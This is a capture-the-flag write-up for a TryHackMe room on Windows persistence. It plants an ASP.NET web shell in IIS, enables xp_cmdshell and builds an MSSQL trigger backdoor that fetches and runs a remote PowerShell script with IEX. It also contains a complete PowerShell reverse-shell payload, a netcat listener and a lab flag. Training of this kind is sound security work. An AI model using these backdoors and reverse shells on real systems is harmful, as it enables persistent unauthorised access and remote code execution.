# About This Module
Module link: https://tryhackme.com/room/windowslocalpersistence

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 07/08/2023

# Using Web Shells
1. Started this room's machine
2. `firefox <URL>` from our Linux attack machine to launch Firefox and redirect it to the ASP.NET web shell Github repository, which we'll then download onto our attack machine 
```Bash
root@ip-10-10-32-42:~# firefox https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Firefox%20cmdaspx.net%20Github.png)

3. `sudo python -m http.server` from our Linux attack machine to start a simple HTTP server on our attack machine to allow our compromised machine to connect back to our attack machine and download the ASP.NET web shell file that we just downloaded from Github
```Bash
root@ip-10-10-32-42:~# sudo python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```
4. `(New-Object System.Net.WebClient).Downloadfile('http://<ATTACK MACHINE IP>:8000/<ASPX.NET WEB SHELL FILE1>','<ASPX.NET WEB SHELL FILE2>.exe')` from our compromised Windows machine to download the ASP.NET web shell file from our attack machine and save it onto this machine with a different name
```PowerShell
PS C:\Users\Administrator> (New-Object System.Net.WebClient).Downloadfile('http://10.10.32.42:8000/cmdasp.aspx','shell.aspx')
```
5. `dir` from our compromised Windows machine to display the files and directories of our current working directory onto our terminal to verify if the ASP.NET web shell file was successfully downloaded from our attack machine, which it was
```PowerShell
PS C:\Users\Administrator> dir
    Directory: C:\Users\Administrator
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/17/2021   3:13 PM                3D Objects
d-r---        3/17/2021   3:13 PM                Contacts
d-r---         6/8/2022   4:40 AM                Desktop
d-r---        5/29/2022  12:07 AM                Documents
d-r---        5/29/2022  12:07 AM                Downloads
d-r---        3/17/2021   3:13 PM                Favorites
d-r---        3/17/2021   3:13 PM                Links
d-r---        3/17/2021   3:13 PM                Music
d-r---        3/17/2021   3:13 PM                Pictures
d-r---        3/17/2021   3:13 PM                Saved Games
d-r---        3/17/2021   3:13 PM                Searches
d-r---        3/17/2021   3:13 PM                Videos
-a----         7/7/2023   9:00 PM          20216 shell.aspx
```
6. `icacls <ASPX.NET WEB SHELL FILE PATH> /grant Everyone:F` from our compromised Windows machine to grant all the users in the system full access and control to the ASP.NET web shell file that we just downloaded from our attack machine
```PowerShell
PS C:\Users\Administrator> icacls shell.aspx /grant Everyone:F
processed file: shell.aspx
Successfully processed 1 files; Failed processing 0 files
```
7. `move <FILE> <DESTINATION PATH>` from our compromised Windows machine to move the <ASPX.NET WEB SHELL FILE2> web shell file to the **C:\inetpub\wwwroot** directory, which is the default directory where web content is stored for the IIS (Internet Information Services) web server, which is a web server software that was developed by Microsoft for Windows that provides the infrastructure and services necessary to host and manage websites, web applications, and other web services
```PowerShell
PS C:\Users\Administrator>move shell.aspx C:\inetpub\wwwroot\
        1 file(s) moved.
```
8. `explorer.exe "http://<TARGET IP>/shell.aspx"` from our compromised Windows machine to launch the Windows Explorer web browser and redirect it to our ASP.NET web shell, which brought us to a web shell that used to run commands on the system 
```PowerShell
PS C:\Users\Administrator> explorer.exe http://10.10.219.169/shell.aspx
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/ASPX.NET%20Web%20Shell%20Open.png)

9. `C:\flags\flag16.exe` from our compromised Windows machine's web shell to run the **flag16.exe**, which ended up displaying this task's flag onto our web shell terminal 

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/ASPX.NET%20Web%20Shell%20Flag.png)

# Using MSSQL as a Backdoor
1. Started this room's machine
2. Search for Microsoft's **Microsoft SQL Server Management Studio 18**, launch it, and then press connect to start using it

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Search.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Launch%20pt2.png)

3. Once the MSSQL Serve Manager has successfully been launched, execute the following four queries:

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Launch%20pt.3.png)

The first query we'll execute is to enable the **xp_cmdshell** stored procedure, which is a procedure that's provided and disabled by default in any MSSQL installation, and allows us to run commands directly in the system's console
```SQL
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Query%201.png)

The second query we'll execute is to ensure that any website and any user accessing the database can run **xp_cmdshell** by granting privileges to all users to impersonate the **sa** (system administrator) user, which is the default database administrator, since only database users with the **sysadmin** role can run the **xp_cmdshell** procedure by default
```SQL
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Query%202.png)

The third query we'll execute is to specify and switch to the database that we want to execute the fourth query in, which was the **HRDB** database
```SQL
USE HRDB
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Query%203.png)

The fourth and last query we'll execute is to configure a trigger that'll download a PowerShell script that we'll create on our attack machine from our attack machine and then execute it whenever an **INSERT** action is made into the **HRDB** database's **Employees** table
```SQL
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://<ATTACK MACHINE IP>:8000/<POWERSHELL SCRIPT>.ps1'')"';
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Query%204.png)

4. `mousepad <POWERSHELL SCRIPT>.ps1` from our Linux attack machinea and insert the following reverse shell PowerShell payload inside 
```PowerShell
$client = New-Object System.Net.Sockets.TCPClient("<ATTACK MACHINE IP>",<PORT NUMBER>);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Creating%20evilscript.ps1.png)

5. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to open up a netcat listener that'll listen for any inbound connections
```Bash
root@ip-10-10-32-42:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```
6. `sudo python -m http.server` from our Linux attack machine to start a simple HTTP server on our attack machine to allow our compromised Windows machine to connect to our attack machine and download the payload that we just created once the trigger we had set up gets triggered
```Bash
root@ip-10-10-32-42:~# sudo python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
7. `explorer.exe http://<TARGET IP>/` from the compromised Windows machine to launch the Windows Explorer web browser and redirect it to the target's IP address, which brought us to a web page from where we can add users into the target's HRDB database to trigger the trigger that we inserted using their MSSQL Server Manager, which ended up working after doing so and creating a reverse shell that connected back to our attack machine's netcat listener that we just had previously set up
```PowerShell
C:\Users\Administrator>explorer.exe "http://10.10.138.69/"
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Insert%20Data%20pt1.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Insert%20Data%20pt2.png)

```Bash
root@ip-10-10-32-42:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.138.69 49758 received!
```

8. `C:\flags\flag17.exe` from the reverse shell to run the **flag17.exe** program, which ended up displaying this task's flag onto our terminal
```PowerShell
PS C:\Windows\system32> C:\flags\flag17.exe
THM{I_LIVE_IN_YOUR_DATABASE}
```


**TASK COMPLETED!**
